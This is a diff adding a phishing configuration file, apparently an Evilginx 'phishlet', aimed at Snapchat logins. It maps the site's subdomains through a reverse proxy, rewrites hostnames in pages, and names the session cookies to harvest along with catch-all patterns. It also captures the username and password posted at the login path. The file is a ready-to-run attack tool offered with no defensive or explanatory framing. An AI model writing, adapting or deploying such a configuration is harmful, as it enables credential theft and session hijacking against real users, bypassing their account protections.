@@ -1,0 +1,47 @@
+author: '@fatiu'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'snapchat.com', session: true, is_landing: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'snapchat.com', session: true, is_landing: false} 
+  - {phish_sub: 'tr', orig_sub: 'tr', domain: 'snapchat.com', session: true, is_landing: false} 
+  - {phish_sub: 'graphql', orig_sub: 'graphql', domain: 'contentful.com', session: true, is_landing: false} 
+  - {phish_sub: 'story', orig_sub: 'story', domain: 'snapchat.com', session: true, is_landing: false} 
+  - {phish_sub: '', orig_sub: '', domain: 'snapchat.com', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'snapchat.com', session: true, is_landing: false}
+  - {phish_sub: 'csp-central', orig_sub: 'csp-central', domain: 'appspot.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+  - domain: '.snapchat.com'
+    keys: ['_sc-sid', '_scid_r', '_scid', '_scfr', 'blizzard_client_id', 'blizzard_web_session_id', 'sc-wcid', 'sc-at',  'sc-a-nonce', '.*,regexp']      
+  - domain: 'accounts.snapchat.com'
+    keys: ['web_client_id', 'sc-cookies-accepted', 'sc-a-csrf', 'sc-a-session', '__Host-sc-a-auth-session', '__Host-sc-a-nonce', '__Host-X-Snap-Client-Cookie', 'xsrf_token', '.*,regexp']    
+
+auth_urls:
+  - '/accounts/v2/welcome'
+  - '/accounts/welcome' 
+  - '/accounts/v2/login'
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'accounts.snapchat.com'
+  path: '/accounts/v2/login'
